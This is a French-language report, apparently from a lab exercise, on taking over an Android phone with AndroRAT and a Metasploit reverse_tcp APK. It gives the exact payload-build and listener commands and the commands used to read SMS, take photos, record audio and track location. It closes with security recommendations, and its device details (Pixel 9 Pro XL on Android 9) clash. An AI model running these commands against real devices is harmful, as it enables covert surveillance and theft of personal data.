# Attaques sur Android

## 📌 Informations Générales
- **Date de l'attaque** : 23/01/2025
- **Système cible** : Android
- **Modèle du téléphone** : Pixel 9 Pro XL
- **Version Android** : Pie android 9.0
- **Adresse IP de l'attaquant** : 10.3.219.27
- **Adresse IP de la victime** : 192.168.232.2

---
---
# I. Rapport d'Attaque avec AndroRAT

## 🎯 Objectif de l'attaque
L'objectif de cette attaque était de tester la compromission d'un appareil Android à l'aide de **AndroRAT**, un Remote Access Trojan (RAT) permettant d'obtenir un contrôle total sur l'appareil cible.



## 🛠️ Méthodologie
### 1️⃣ Génération de l'APK Malveillant
Commande utilisée :
```
python3 androRAT.py --build -i 10.3.219.27 -p 4444 test1.apk
```

### 2️⃣ Installation et Exécution de l'APK
- L'APK a été transférée et installée sur le téléphone cible via un serveur HTTP.
- Une fois lancée, l'application a établi une connexion avec la machine attaquante.

### 3️⃣ Prise de Contrôle et Extraction des Données
Une fois connecté, les commandes suivantes ont été exécutées :

#### 📩 Accès aux Messages SMS
```
getSMS sent
getSMS inbox
```
- Extraction et affichage de tous les SMS stockés sur l’appareil.

![sms](sms_resultat.png)

#### 📷 Accès à la Caméra
```
camList

takepic 0
takepic 1
```
- Capture d'images via la caméra avant/arrière.

![sms](image_result.png)

#### 🎙️ Enregistrement Audio
```
startAudio
stopAudio
```
- Activation du microphone et enregistrement audio.

![sms](audio_result.png)

#### 📂 Accès aux Fichiers Stockés
```bash
file list /sdcard
```
- Exploration des fichiers enregistrés sur l’appareil.

#### 📍 Géolocalisation de l’Appareil
```
getLocation
```
- Récupération des coordonnées GPS en temps réel.

![sms](location.png)

---
---

# II. Rapport d'Attaque via Metasploit (Payload APK)
## 🎯 Objectif de l'attaque
L'objectif de cette attaque était de tester la compromission d'un appareil Android à l'aide d'un payload APK malveillant généré et exploité via **Metasploit Framework**, permettant d'obtenir un contrôle distant sur l'appareil cible.


## 🛠️ Méthodologie
### 1️⃣ Génération de l'APK Malveillant
Commande utilisée pour générer le payload :
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.3.219.27 LPORT=4445 R > payload.apk
```
- **LHOST** : Adresse IP de l'attaquant.
- **LPORT** : Port d'écoute sur la machine attaquante.

### 2️⃣ Installation et Exécution de l'APK
- L'APK a été transféré et installé sur le téléphone cible via un serveur HTTP local.
- Une fois lancée, l'application a établi une connexion avec la machine attaquante.

### 3️⃣ Configuration de Metasploit pour la Connexion
Commande utilisée pour configurer l'écouteur :
```
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 10.3.219.27
set LPORT 4445
exploit
```
Une session **meterpreter** a été ouverte avec succès une fois que l'APK a été exécuté.

![sms](metasploit.png)
---

## 📝 Résultats des Attaques
| Fonctionnalité | Résultat |
|--------------|---------|
| Accès aux SMS | ✅ Succès |
| Accès à la caméra | ✅ Succès (Images capturées) |
| Enregistrement audio | ✅ Succès (Fichier audio enregistré) |
| Accès aux fichiers | ✅ Succès (Exploration et extraction) |
| Géolocalisation | ✅ Succès (Coordonnées GPS obtenues) |
## 🔐 Recommandations de Sécurité
- **Ne pas installer d’APK provenant de sources inconnues.**
- **Restreindre les permissions des applications non fiables.**
- **Utiliser un antivirus pour analyser les applications avant installation.**
- **Garder Android et les applications à jour pour corriger les vulnérabilités.**
- **Activer Google Play Protect pour détecter les comportements suspects.**

---

## 📌 Conclusion
Ces différentes attaques ont permis de démontrer la facilité avec laquelle un appareil Android peut être compromis si l'utilisateur ne suit pas les bonnes pratiques de sécurité. Ce test souligne l'importance d'une sensibilisation accrue aux cybermenaces sur mobile.


